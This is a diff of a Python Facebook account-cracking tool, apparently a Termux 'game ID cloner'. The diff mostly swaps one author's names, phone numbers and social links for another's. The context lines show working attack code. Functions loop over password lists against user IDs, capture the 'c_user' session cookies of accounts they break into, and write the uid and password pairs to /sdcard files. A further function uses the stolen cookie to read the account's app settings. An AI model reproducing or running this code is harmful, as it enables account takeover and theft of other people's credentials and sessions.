@@ -1,6 +1,6 @@
-#RDJ(SAT SHAHIN YT)(SHAHI. ALAM)
-#WhatsApp : 01615161056
-#Github : RDJ1x1
+#MRX(MUHAMMAD ZAHIRUL)(MD JIBON ISLAM)
+#WhatsApp : 01865544636
+#Github : MRX-JIBON-SARKAR
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
 #!/usr/bin/python3
@@ -147,16 +147,19 @@ def menu_apikey():
 
   os.system(" clear")                          
   print("""\x1b[1;97m
-▀▀█▀▀ ░█▀▀▀█ ░█▄─░█ ░█──░█ 　 ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ ░█─▄▀ 
-─░█── ░█──░█ ░█░█░█ ░█▄▄▄█ 　 ─▀▀▀▄▄ ─░█── ░█▄▄█ ░█▄▄▀ ░█▀▄─ 
-─░█── ░█▄▄▄█ ░█──▀█ ──░█── 　 ░█▄▄▄█ ─░█── ░█─░█ ░█─░█ ░█─░█
+
+███    ███ ██████           ██ ██ ██████   ██████  ███    ███ 
+████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████  ████ 
+██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ████ ██ 
+██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██  ██ 
+██      ██ ██   ██      █████  ██ ██████   ██████  ██      ██                                                                                                                           
 
     ┌───────────────────────────────────────┐
-    │ [✓] AUTHOR   : BAYAZID            │
-    │ [✓] LIKE   : MARVEL                 │
-    │ [✓] WHATSAPP : +8801941366999         │
-    │ [✓] VERSION  : 1.0                  │
-    │ [✓] TOOLS    : \033[1;32m RANDOM GAME ID CLONER  \033[1;37m│
+    │ [✓] AUTHOR   : MRX JIBON            
+    │ [✓] LIKE   : PYTHON                  
+    │ [✓] WHATSAPP : +8801846738727         
+    │ [✓] VERSION  : 1.0                  
+    │ [✓] TOOLS    : \033[1;32m RANDOM GAME ID CLONER  \033[1;37m
     └───────────────────────────────────────┘""")
   print(f"\t \033[1;32m BIG FAN OF ROBERT DOWNER JR ™ \033[1;37m ")
   print(f"")
@@ -175,7 +178,7 @@ def menu_apikey():
   print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
   print(f"")
   print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
-  os.system(f'xdg-open https://www.facebook.com/ridoysharkarofficial.5')
+  os.system(f'xdg-open https://www.facebook.com/profile.php?id=61551394177803&mibextid=ZbWKwL')
   print(f"");time.sleep(2)
   print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
@@ -199,16 +202,19 @@ def menu_apikey():
     	menu_apikey()
 menu_apikey()
 logo=(f"""\x1b[1;97m
-▀▀█▀▀ ░█▀▀▀█ ░█▄─░█ ░█──░█ 　 ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ ░█─▄▀ 
-─░█── ░█──░█ ░█░█░█ ░█▄▄▄█ 　 ─▀▀▀▄▄ ─░█── ░█▄▄█ ░█▄▄▀ ░█▀▄─ 
-─░█── ░█▄▄▄█ ░█──▀█ ──░█── 　 ░█▄▄▄█ ─░█── ░█─░█ ░█─░█ ░█─░█
+
+███    ███ ██████           ██ ██ ██████   ██████  ███    ███ 
+████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████  ████ 
+██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ████ ██ 
+██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██  ██ 
+██      ██ ██   ██      █████  ██ ██████   ██████  ██      ██                                                                                                                     
 
     ┌───────────────────────────────────────┐
-    │ [✓] AUTHOR   :  BAYAZID           │
-    │ [✓] LIKE    : MARVEL                │
-    │ [✓] WHATSAPP : +8801941366999         │
-    │ [✓] VERSION  : 1.0                   │
-    │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m│
+    │ [✓] AUTHOR   :  MRX JIBON           
+    │ [✓] LIKE    :  PYTHON                
+    │ [✓] WHATSAPP : +8801865544636         
+    │ [✓] VERSION  : 1.0                   
+    │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m
     └───────────────────────────────────────┘""")
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -260,18 +266,18 @@ def admin():
 	print(logo)
 	print(50*'_')
 	print(' [1] Contract WhatsApp ')
-	print(' [2] Follow Facebook ')
-	print(' [3] Subscribe Youtube')
+	print(' [2] Follow Facebook Page')
+	print(' [3] Follow Facebook Profile')
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801941366999');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801846738727');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/sat.shahinyt');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/profile.php?id=61551394177803&mibextid=ZbWKwL');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://youtube.com/channel/UCk-u5MzpXGsHJDvtPAW-zbg');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -383,7 +389,7 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRDJ1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -423,16 +429,16 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [RDJ-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
-                open('/sdcard/RDJ-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\r\x1b[38;5;196m[cp] {uid}|{ps}")
-                open('/sdcard/RDJ1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/MRX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
@@ -449,7 +455,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRDJ1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -489,11 +495,11 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [RDJ-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/RDJ-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -508,7 +514,7 @@ def c(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRDJ1×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -548,12 +554,12 @@ def c(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [RDJ-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Numer : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/RDJ-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/MRX.txt', 'a').write(cid+' | '+ps+'\n')
                 break
             else:
                 continue
